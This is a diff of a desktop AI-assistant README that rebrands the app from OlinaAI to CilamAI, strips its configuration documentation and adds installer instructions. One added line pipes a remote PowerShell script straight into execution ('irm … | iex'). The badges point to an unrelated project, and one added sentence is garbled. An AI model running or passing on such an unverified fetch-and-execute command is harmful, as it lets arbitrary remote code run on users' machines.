@@ -1,26 +1,46 @@
-# OlinaAI
+<div align="center">
 
-A fast, private, cross-platform AI assistant desktop app built with Electron and Vite, supporting multiple models (Ollama, OpenAI, OpenCode) with streaming, themes, file uploads, and image (vision) support.
+<img src="https://file.garden/aPSLaf7myCkWreuK/OlinaAI__2_-removebg-preview.png" width="400" alt="CilamAI Logo" />
+<p align="center">
+  <a href=""><img alt="npm" src="https://img.shields.io/npm/v/opencode-ai?style=flat-square" /></a>
+  <a href="https://github.com/CilamAI/CilamAI/issues"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/publish.yml?label=build&style=flat-square" /></a>
+</p>
 
-## Features
+# CilamAI v1.0
 
-* **Multi-provider support**: Ollama, OpenAI, and OpenCode inference with a single configurable endpoint.
-* **Streaming responses**: token-by-token streaming with a collapsible "Thinking" block for reasoning models.
-* **Chat themes**: dark, light, blue, red, yellow, and a system-aware theme that follows your OS.
-* **File & image uploads**: upload images (vision), with inline preview chips and a 10 MB limit (audio/video blocked). Vision payloads are sent as base64 to the API.
-* **Native-feeling window**: frameless titlebar with centered menu bar (File, View, Window), Windows 11 Mica/Acrylic backdrop support, and custom window controls.
-* **Keyboard-first**: Enter to send, Escape to close menus, global hotkeys, and a focused composer with model selector.
-* **Local-first settings**: preferences (theme, model, provider, API key, streaming, startup launch, font size) persist in the app's userData directory (`Ollama 2` on Windows).
-* **Startup launcher**: launches on login with a 5s branded loading screen.
+**Languages:** Korean, English, Turkish, Russian
+
+</div>
+
+For this name CilamAI real source code you (warning, .env this your key opencode)
+
+## Screenshots
+
+<div align="center">
+
+<img src="https://file.garden/aPSLaf7myCkWreuK/Untitled%20design%20(7).png" width="600" alt="CilamAI Screenshot" />
+
+</div>
 
 ## Getting Started
+
+### Install on Windows
+
+Download the installer and run it:
+
+* **[Download CilamAI-Setup.exe](https://github.com/CilamAI/CilamAI/releases/latest/download/CilamAI-Setup.exe)** double-click, click through the wizard, and CilamAI is installed and ready to launch.
+* The installer creates Start Menu and optional desktop shortcuts, and uninstalls cleanly via *Uninstall CilamAI*.
+
+### Install for desktop windows
+
+```bash
+irm https://raw.githubusercontent.com/CilamAI/CilamAI/refs/heads/main/install.ps1 | iex
+```
 
 ### Prerequisites
 
 * **Node.js** 20+ and npm
-* For Ollama provider: a running [Ollama](https://ollama.com) instance
-* For OpenAI provider: a valid OpenAI API key
-* For OpenCode provider: an [OpenCode](https://opencode.ai) API key
+* **Git** (to clone the repository)
 
 ### Install & run
 
@@ -45,44 +65,6 @@ npm run build
 npm start
 ```
 
-### Configuration
-
-| Setting | Description |
-|---------|-------------|
-| `provider` | `openai`, `ollama`, or `opencode` |
-| `openaiUrl` | API base URL |
-| `apiKey` | Bearer token for the chosen provider |
-| `stream` | Enable/disable streaming (default true) |
-| `theme` | dark, light, blue, red, yellow, or system |
-| `model` | Default chat model (e.g. `gemma4:26b`) |
-| `fontSize` | Chat font size (13/14/15/17) |
-| `startupLaunch` | Launch app on login |
-
-API keys are never committed, they are stored only in your local userData directory.
-
-## Project Structure
-
-```
-src/
-  main/index.js
-  preload/index.js
-  renderer/
-    index.html
-    loading.gif
-    src/
-      main.js
-      style.css
-      App.js
-      highlight.css
-```
-
-## Development
-
-* `npm start` = `electron-vite preview` (serves **built** output from `out/`). Edit, build, then restart.
-* `npm run dev` = `electron-vite dev` (live reload of source).
-* IPC channels: `chat:send`, `chat:send-stream`, `chat:stream-chunk`, `chat:stream-reasoning`, `chat:stop-stream`, `file:upload`, `window:*`.
-* Model menu is populated from the provider's `/models` endpoint (OpenAI `data[].id` or Ollama `models[].name`), with a searchable dropdown.
-
 ## Keyboard Shortcuts
 
 | Keys | Action |
@@ -92,21 +74,6 @@ src/
 | Ctrl/Cmd + K | Reset / New chat |
 | Ctrl/Cmd + Shift + U | Upload file |
 
-## Theming
-
-Each theme is a full set of CSS custom properties. Switching theme updates the live `data-theme` attribute on `html` and persists the selection. The `system` theme reads `prefers-color-scheme` and updates live with OS changes.
-
-## Roadmap
-
-* Native notifications for new messages
-* Session history / local conversation persistence
-* Plugin support for custom providers
-
 ## License
 
-MIT. See [LICENSE](LICENSE).
-
-## Links
-
-* GitHub: [https://github.com/OlinaAI/OlinaAI](https://github.com/OlinaAI/OlinaAI)
-* Issues: [https://github.com/OlinaAI/OlinaAI/issues](https://github.com/OlinaAI/OlinaAI/issues)
+Apache-2.0. See [LICENSE](LICENSE).
